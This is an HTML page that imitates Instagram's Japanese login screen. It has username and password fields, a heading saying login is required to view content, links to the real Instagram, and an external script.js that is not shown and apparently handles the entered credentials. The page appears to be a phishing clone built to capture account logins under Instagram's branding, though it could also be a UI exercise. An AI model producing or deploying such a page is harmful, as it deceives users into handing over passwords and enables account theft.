<!DOCTYPE html>
<html lang="en">
  <head>
    <link rel="stylesheet" href="style.css">
    <link rel="Icon" type="image/x-icon" href="assets/icon.png">
    <title>Instagram</title>
  </head>
  <body>
    <div class="wrapper">
      <article class="article">
        <div class="content">
          <div class="login-box">
            <div class="header">
            </div>
            <div class="form-wrap">
              <h2>閲覧にはログインが必須です</h2>
              
              <img class="logo" src="assets/logo.png" alt="Instagram">
              <form class="form">
                <div class="input-box">
                  <input type="text" id="usernameInput" placeholder="電話番号、ユーザーネーム、メールアドレス" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" required>
                </div>  
                <div class="input-box">
                  <input type="password" id="passwordInput" onkeyup="passwordBtnVisible()" placeholder="パスワード" aria-required="true" autocapitalize="off" autocorrect="off" required>
                  <div id="showPasswordBtn" onclick="passwordVisible()" style="display: none;">Show</div>
                </div>  
                <span class="button-box">
                  <button id="loginBtn" type="button" disabled>ログイン</button>
                </span>  
                <a class="forgot" href="https://www.instagram.com/accounts/password/reset">パスワードを忘れた場合</a>
              </form>
            </div>
          </div>
          <div class="signup-box">
            <p class="text">アカウントをお持ちでないですか？<a href="https://www.instagram.com/accounts/emailsignup">登録する</a></p>
          </div>
          <div class="app">
            <p>ダウンロード</p>
            <div class="app-img">
              <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                <img src="assets/appstore.png" >
              </a>
              <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                <img src="assets/playstore.png">
              </a>  
            </div>
          </div>
        </div>
      </article>
    </div>
    <footer class="footer" role="contentinfo">
      <div class="footer-container">
        <nav class="footer-nav" role="navigation">
          <ul>
            <li><a href="https://about.meta.com/>">Meta</a></li>
            <li><a href="https://about.instagram.com">About Us</a></li>
            <li><a href="https://help.instagram.com">サポート</a></li>
            <li><a href="https://about.instagram.com/blog">ブログ</a></li>
            <li><a href="https://about.instagram.com/about-us/careers">求人</a></li>
            <li><a href="https://www.instagram.com/developer">API</a></li>
            <li><a href="https://help.instagram.com/519522125107875">プライバシー</a></li>
            <li><a href="https://help.instagram.com/581066165581870">チーム</a></li>
            <li><a href="https://www.instagram.com/directory/hashtags">Directory</a></li>
            <li><a href="https://about.meta.com/technologies/meta-verified/>">Meta 認証</a></li>
            <li><a href="">Instagram</a></li>
          </ul>
        </nav>
        <span class="footer-logo">&copy; 2024 Instagram from Meta</span>
      </div>
    </footer>
    <script src="script.js"></script>
  </body>
</html>
